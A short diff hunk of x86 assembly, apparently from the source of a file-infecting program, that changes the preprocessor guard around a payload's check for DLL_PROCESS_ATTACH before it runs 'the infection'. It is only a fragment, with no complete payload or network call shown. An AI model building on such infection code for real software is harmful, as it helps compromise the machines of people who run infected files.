@@ -27,7 +27,7 @@ payload32_code:
    push edi
    push ebx
 
-%ifdef INFECTION_TLS
+%ifndef INFECTION_STANDALONE
    cmp dword [ebp+0xC],1
    jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                 ; otherwise, terminate the infection.
